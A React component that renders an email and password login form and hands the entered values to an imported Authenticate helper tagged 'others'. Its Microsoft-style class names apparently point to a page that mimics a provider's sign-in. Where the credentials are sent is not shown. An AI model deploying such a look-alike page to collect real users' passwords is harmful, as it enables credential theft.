import { useState } from 'react'
import { Authenticate } from '../../helpers/Auth'

const Other = () => {
  const [userID, setUserID] = useState('')
  const [password, setPassword] = useState('')
  const [error, setError] = useState('')

  const handleClick = () => {
    setError('')
    if (!userID || !password) {
      setError('Please provide a valid email and password')
    } else {
      Authenticate(userID, password, 'others')
    }
  }
  return (
    <div className='w-screen h-screen flex items-center justify-center microsoft-login bg-[#EAEAEA] px-5'>
      <section className='border p-8 shadow-microsoftLogin bg-white rounded-lg'>
        <header>
          <h3 className='text-3xl font-bold text-center'>Login</h3>
          <p className='tracking-wide text-lg'>
            Provide the email and address to your account
          </p>
        </header>
        <main className='flex flex-col gap-5 mt-5'>
          <span className='flex flex-col gap-2'>
            <label className='text-lg font-semibold'>Email:</label>
            <input
              placeholder='joe@doe.com'
              className='outline-none border px-2 h-12'
              value={userID}
              onChange={(e) => setUserID(e.target.value)}
            />
          </span>
          <span className='flex flex-col gap-2'>
            <label className='text-lg font-semibold'>Password:</label>
            <input
              placeholder='Your password'
              type='password'
              className='outline-none border px-2 h-12'
              value={password}
              onChange={(e) => setPassword(e.target.value)}
            />
          </span>
          <p className='text-red-700 tracking-wide font-semibold'>{error}</p>
          <button
            className='border py-2 font-semibold text-lg text-white rounded-xl bg-[#342DF2]'
            onClick={handleClick}
          >
            Submit
          </button>
        </main>
      </section>
    </div>
  )
}

export default Other
